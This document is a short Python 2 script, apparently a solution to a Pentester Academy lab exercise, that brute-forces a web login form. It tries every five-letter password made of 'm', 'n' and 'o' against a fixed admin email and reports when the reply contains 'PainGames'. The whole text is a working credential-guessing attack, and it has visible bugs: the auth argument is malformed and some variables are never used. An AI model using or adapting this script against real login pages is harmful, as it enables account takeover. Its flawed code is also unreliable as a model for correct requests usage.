import requests
import base64
from requests.auth import HTTPBasicAuth

url = 'http://pentesteracademylab.appspot.com/lab/webapp/auth/form/1'
USERNAME = 'admin@pentesteracademy.com' 
PASSWORD = 'aaaaa'
a = ['m','n','o']
x = ['a','a','a','a','a']
listToTry = [0]*(5*5*5*5*5)
i = 0
for j0 in range(0,3):
	for j1 in range(0,3):
		for j2 in range(0,3):
			for j3 in range(0,3):
				for j4 in range(0,3):
					x[0] = a[j0]
					x[1] = a[j1]
					x[2] = a[j2]
					x[3] = a[j3]
					x[4] = a[j4]   
					listToTry = ''.join(x)	
					PASSWORD = listToTry
					payload = {'email': USERNAME,'password': PASSWORD}
					login_data = dict(username=USERNAME,password=PASSWORD)
#					p = requests.post(url,payload)
					passstring = USERNAME + ":" + PASSWORD
					passstring = base64.b64encode(passstring)
					p = requests.Session().post(url,auth = passstring)
					i= i+1
					if ("PainGames" in p.content):
						print i,PASSWORD,"***************** Sucess **********************"
					else:
						print i,PASSWORD,"Failed"
				

	
	
